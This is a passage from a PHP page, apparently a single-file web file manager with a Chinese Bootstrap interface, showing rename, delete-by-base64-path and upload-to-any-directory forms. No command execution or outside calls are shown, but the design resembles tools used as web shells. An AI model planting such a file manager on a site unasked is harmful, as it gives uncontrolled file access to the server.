                                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
                                            <button type="submit" class="btn btn-primary">重命名</button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>

                        <script>
                            function deleteFile(pathB64) {
                                const form = document.createElement('form');
                                form.method = 'POST';
                                form.style.display = 'none';

                                const actionInput = document.createElement('input');
                                actionInput.type = 'hidden';
                                actionInput.name = 'file_action';
                                actionInput.value = 'delete';
                                form.appendChild(actionInput);

                                const pathInput = document.createElement('input');
                                pathInput.type = 'hidden';
                                pathInput.name = 'path_b64';
                                pathInput.value = pathB64;
                                form.appendChild(pathInput);

                                document.body.appendChild(form);
                                form.submit();
                            }

                            document.getElementById('renameModal').addEventListener('show.bs.modal', function (event) {
                                var button = event.relatedTarget;
                                var filePathB64 = button.getAttribute('data-filepath');
                                var fileName = button.getAttribute('data-filename');

                                var modal = this;
                                modal.querySelector('#rename_old_path_b64').value = filePathB64;
                                modal.querySelector('#rename_old_name').value = fileName;
                                modal.querySelector('#rename_new_name').value = fileName;
                            });
                        </script>
                    </div>
                </div>
                <?php
                break;

            case 'upload':
                ?>
                <div class="card">
                    <div class="card-header"><i class="fas fa-upload"></i> 文件上传</div>
                    <div class="card-body">
                        <form method="POST" enctype="multipart/form-data">
                            <input type="hidden" name="file_action" value="upload">
                            <div class="mb-3">
                                <label for="upload_path" class="form-label">上传路径</label>
                                <input type="text" class="form-control" id="upload_path" name="upload_path" value="<?php echo htmlspecialchars($current_dir); ?>" required>
                                <div class="form-text text-muted">文件将上传到此目录。请确保目录存在且可写入。</div>
                            </div>
                            <div class="mb-3">
                                <label for="file_to_upload" class="form-label">选择文件</label>
                                <input type="file" class="form-control" id="file_to_upload" name="file_to_upload" required>
                            </div>
                            <button type="submit" class="btn btn-primary"><i class="fas fa-upload"></i> 上传文件</button>
                        </form>
                    </div>
                </div>
                <?php
                break;
        }
        ?>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>